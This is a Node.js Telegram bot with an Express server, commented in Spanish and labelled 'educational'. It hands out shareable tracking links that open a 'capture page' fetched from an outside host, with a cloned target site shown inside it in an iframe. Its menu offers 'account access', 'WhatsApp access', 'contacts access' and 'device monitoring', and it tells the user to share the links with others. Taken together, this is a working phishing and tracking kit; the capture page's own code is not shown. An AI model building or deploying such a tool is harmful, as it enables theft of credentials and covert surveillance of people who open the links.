const express = require('express');
const { Telegraf } = require('telegraf');
const crypto = require('crypto');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
const PORT = process.env.PORT || 3000;

// ========== TOKEN ==========
const BOT_TOKEN = process.env.BOT_TOKEN;
if (!BOT_TOKEN) {
    console.error('❌ ERROR: Falta BOT_TOKEN');
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// ========== ALMACENAMIENTO ==========
const tokens = {};
const userStates = {};

function generateToken() {
    return crypto.randomBytes(6).toString('hex');
}

function createTrackLink(originalUrl, chatId) {
    const token = generateToken();
    tokens[token] = { 
        url: originalUrl, 
        timestamp: Date.now(),
        chatId: chatId
    };
    const baseUrl = process.env.BASE_URL || 'https://mi-bot-clon.onrender.com';
    // ⚠️ Quita cualquier barra al final de la baseUrl
    const cleanBase = baseUrl.replace(/\/+$/, '');
    return `${cleanBase}/track/${token}`;
}

// ========== RUTA QUE MUESTRA TU PÁGINA DE CAPTURA CON IFRAME ==========
app.get('/track/:token', async (req, res) => {
    const token = req.params.token;
    const data = tokens[token];
    
    if (!data) {
        return res.status(404).send(`
            <h1>🔴 Enlace no válido</h1>
            <p>El enlace que intentas abrir no existe o ha expirado.</p>
            <p>Genera uno nuevo desde el bot de Telegram.</p>
        `);
    }
    
    const targetUrl = data.url;
    
    try {
        // 🔥 INTENTAR LEER EL HTML LOCAL (si existe)
        let html;
        try {
            html = fs.readFileSync(path.join(__dirname, 'pagina-captura.html'), 'utf8');
        } catch (e) {
            // Si no existe, descargarlo desde la URL
            const response = await fetch('https://karkstrck.onrender.com/');
            html = await response.text();
        }
        
        // ========== INYECTAR EL IFRAME ==========
        const iframeHtml = `
        <div style="margin-top:20px; border:1px solid #ccc; border-radius:8px; overflow:hidden;">
            <iframe src="${targetUrl}" style="width:100%; height:400px; border:none;"></iframe>
        </div>
        `;
        
        // Insertar el iframe después del div .card (o donde quieras)
        html = html.replace('</div>', iframeHtml + '</div>');
        
        res.send(html);
        
    } catch (error) {
        console.error('Error al cargar la página de captura:', error);
        res.status(500).send('Error al cargar la página de captura');
    }
});

// ========== RUTA PRINCIPAL ==========
app.get('/', (req, res) => {
    res.send(`
        <h1>🔐 Bot Clonador Educativo</h1>
        <p>Bot activo y funcionando.</p>
        <p>Usa /start en Telegram para comenzar.</p>
    `);
});

// ========== COMANDOS DEL BOT ==========
bot.start(async (ctx) => {
    const msg = `🔐 *KALI LINUX BOT*
━━━━━━━━━━━━━━━━
$ root@system: Access Granted ~
Bienvenido al bot educativo.
Usa /menu para ver las opciones.`;
    await ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('menu', async (ctx) => {
    const keyboard = {
        inline_keyboard: [
            [{ text: '📍 Monitoreo de Dispositivo', callback_data: 'monitoreo' }],
            [{ text: '👥 Acceso a Cuentas', callback_data: 'cuentas' }],
            [{ text: '👤 Acceso a Contactos', callback_data: 'contactos' }],
            [{ text: '💬 Acceso a WhatsApp', callback_data: 'whatsapp' }],
            [{ text: '❓ Mi Información', callback_data: 'info' }]
        ]
    };
    await ctx.reply('🎯 *Selecciona una opción:*', { 
        parse_mode: 'Markdown',
        reply_markup: keyboard 
    });
});

// ========== MANEJADORES DE BOTONES ==========
async function handleGenerateLink(ctx) {
    await ctx.answerCbQuery();
    const chatId = ctx.chat.id;
    userStates[chatId] = 'esperando_url';
    await ctx.reply('📎 *Envía la URL del sitio que quieres clonar*\nEjemplo: https://ejemplo.com', {
        parse_mode: 'Markdown'
    });
}

bot.action('monitoreo', handleGenerateLink);
bot.action('cuentas', handleGenerateLink);
bot.action('contactos', handleGenerateLink);
bot.action('whatsapp', handleGenerateLink);

bot.action('info', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply('ℹ️ Bot educativo. No compartas enlaces sin consentimiento.');
});

// ========== CAPTURAR LA URL ==========
bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    const texto = ctx.message.text.trim();
    
    if (userStates[chatId] === 'esperando_url') {
        delete userStates[chatId];
        if (texto.startsWith('http://') || texto.startsWith('https://')) {
            const trackLink = createTrackLink(texto, chatId);
            await ctx.reply(`✅ *Enlace generado:*\n${trackLink}\n\n📎 Comparte este enlace. Cuando alguien lo abra, verá tu página de captura con el sitio clonado.`, {
                parse_mode: 'Markdown'
            });
        } else {
            await ctx.reply('❌ *URL inválida.* Debe comenzar con http:// o https://', {
                parse_mode: 'Markdown'
            });
        }
    }
});

// ========== SERVIDOR ==========
app.listen(PORT, () => {
    console.log(`🚀 Servidor en puerto ${PORT}`);
});

bot.launch().then(() => {
    console.log('✅ Bot conectado');
}).catch(err => {
    console.error('❌ Error:', err);
});